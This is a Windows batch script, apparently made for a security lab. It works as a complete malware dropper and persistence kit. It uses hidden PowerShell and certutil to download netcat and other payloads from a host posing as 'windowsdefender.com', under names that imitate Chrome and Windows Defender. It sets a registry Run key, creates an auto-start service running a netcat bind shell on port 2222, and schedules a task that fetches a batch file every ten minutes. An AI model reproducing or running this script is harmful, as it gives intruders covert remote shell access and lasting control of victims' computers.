@ECHO OFF
powershell -noprofile -windowstyle hidden -ep bypass certutil -urlcache -f http://windowsdefender.com:81/nc.exe C:\ProgramData\Chrome\ChromeUpdate.exe
powershell -noprofile -windowstyle hidden -ep bypass certutil -urlcache -f http://windowsdefender.com:81/WindowsDefender.exe "C:\Program Files\Defender\WindowsDefender.exe"
cmd /q /c reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefender /t REG_SZ /d "C:\Program Files\Defender\WindowsDefender.exe"
cmd /q /c sc create ChromeUpdateService binpath= "cmd.exe /k C:\ProgramData\Chrome\ChromeUpdate.exe -L -p 2222 -e cmd.exe" start= auto
cmd /q /c sc start ChromeUpdateService
powershell -noprofile -windowstyle hidden -ep bypass certutil -urlcache -f http://windowsdefender.com:81/Schedule.bat C:\Users\Administrator\Desktop\payloads\lab1.2\Schedule.bat
schtasks /create /sc minute /mo 10 /tn "HealthChecker" /tr "C:\Users\Administrator\Desktop\payloads\lab1.2\Schedule.bat"
cmd /q /k ""C:\Program Files\Defender\WindowsDefender.exe""
